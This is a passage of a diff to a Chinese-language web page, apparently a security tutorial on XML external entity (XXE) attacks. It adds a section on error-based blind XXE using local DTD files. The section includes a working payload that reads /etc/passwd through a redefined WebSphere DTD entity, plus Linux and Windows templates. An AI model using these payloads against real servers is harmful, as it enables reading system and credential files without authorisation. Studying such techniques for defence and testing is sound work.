@@ -425,6 +425,41 @@
 &lt;/root&gt;
 </code></pre>
 <p><br></p>
+<h5 id="五、利用本地dtd文件报错回显"><a href="#五、利用本地dtd文件报错回显" class="headerlink" title="五、利用本地dtd文件报错回显"></a>五、利用本地dtd文件报错回显</h5><p>当你有一个支持外部实体的XXE，但服务器的响应始终为空，这样情况就需要Blind XXE，但是如果你和目标服务器之间有防火墙，一般的利用vps外带数据的方法就不能用了。</p>
+<p>首先要知道，外部DTD允许我们在第二个实体中包含一个实体，但它在内部DTD中是被禁止的。</p>
+<p>所以要想在内部DTD子集中使用外部DTD语法，你可以在目标主机上强制执行本地dtd文件，并在其中重新定义一些参数实体引用：</p>
+<p>Payload:</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;
+
+    &lt;!ENTITY % condition &#39;aaa)&gt;
+        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+        &amp;#x25;eval;
+        &amp;#x25;error;
+        &lt;!ELEMENT aa (bb&#39;&gt;
+
+    %local_dtd;
+]&gt;
+&lt;message&gt;any text&lt;/message&gt;
+</code></pre>
+<p>sip-app_1_0.dtd 中的内容</p>
+<pre><code class="xml">&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;
+&lt;!ELEMENT pattern (%condition;)&gt;
+</code></pre>
+<p>它起作用是因为所有XML实体都是常量，如果定义两个具有相同名称的实体则仅使用第一个实体。</p>
+<p><strong>Linux</strong></p>
+<pre><code class="xml">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+&lt;!ENTITY % ISOamsa &#39;Your DTD code&#39;&gt;
+%local_dtd;
+</code></pre>
+<p><strong>Windows</strong></p>
+<pre><code class="xml">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;
+&lt;!ENTITY % SuperClass &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;
+%local_dtd;
+</code></pre>
+<p><br></p>
 <h3 id="0x04-判断XXE漏洞"><a href="#0x04-判断XXE漏洞" class="headerlink" title="0x04 判断XXE漏洞"></a>0x04 判断XXE漏洞</h3><p><br></p>
 <h5 id="一、XML是否被解析"><a href="#一、XML是否被解析" class="headerlink" title="一、XML是否被解析"></a>一、XML是否被解析</h5><p>尝试提交测试payload：</p>
 <pre><code class="xml">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;   
